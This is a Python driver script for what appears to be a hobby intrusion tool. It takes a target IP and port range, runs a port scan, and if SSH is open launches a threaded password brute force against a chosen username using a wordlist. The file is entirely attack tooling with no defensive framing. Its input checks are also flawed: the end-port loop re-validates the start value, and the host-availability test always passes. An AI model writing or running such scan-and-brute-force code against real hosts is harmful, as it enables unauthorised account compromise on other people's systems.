import sys, os

from hostchecker.TargetAvailability import TargetAvailability
from scanport.PortScanner import PortScanner
from sshcracker.ConnectSSH import ConnectSSH
from atackmethod.Bruteforce import brut_force
from validation.ValidateIPV4 import validate_ipv4
from validation.ValidateNumber import check_if_number

# Config
timeout_half_sec = 0.5
timeout_two_sec = 2
timeout = 3
TCP_SYN_FLAG = 'S'
TCP_RST_FLAG = 'R'
stop_flag = 0
ssh_port = 22


def main():
    target_host_ip = input("Please add target_host_ip: ")

    while not validate_ipv4(target_host_ip):
        print("Invalid IPv4 address. Please enter a valid IPv4 address.")
        target_host_ip = input("Please add target_host_ip: ")

    port_start_val = input("Please add scan port start number:  ")

    while not check_if_number(port_start_val):
        print("Invalid value. Please enter a valid port number.")
        port_start_val = input("Please add scan port start number:  ")

    port_end_val = input("Please add scan port end number:  ")

    while not check_if_number(port_start_val):
        print("Invalid value. Please enter a valid port number.")
        port_end_val = input("Please add scan port end number:  ")

    registered_ports = range(int(port_start_val), int(port_end_val))
    open_ports = []

    portscanner = PortScanner(target_host_ip, timeout_half_sec, timeout_two_sec, TCP_RST_FLAG, TCP_SYN_FLAG)
    target_availability = TargetAvailability()
    connect_ssh = ConnectSSH(target_host_ip, ssh_port, stop_flag)
    target_availability.check_host_availible(target_host_ip, timeout)

    if target_availability:

        print("Port scan start")
        for i in registered_ports:
            status = portscanner.scan_potrs(i)
            if status:
                print(f"Open port {i}")
                open_ports.append(i)
    print(f"List of open ports: {open_ports}")
    print("Scan finished")

    if 22 in open_ports:
        user_input = input('Do you want to atak ssh (yes/no): ')
        yes_choices = ['yes', 'y']
        no_choices = ['no', 'n']
        if user_input.lower() in yes_choices:
            host = target_host_ip
            username = input('[+] SSH Username: ')
            input_file = input('[+] Passwords File: ')
            input_file = "pass/" + input_file
            print('\n')

            if not os.path.exists(input_file):
                print('[!!] That File/Path Does Not Exist')
                sys.exit(1)

            print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')
            print('\n')
            brut_force(input_file, username, connect_ssh, stop_flag)
        elif user_input.lower() in no_choices:
            print('user typed no')
        else:
            print('Type yes or no')


if __name__ == "__main__":
    main()
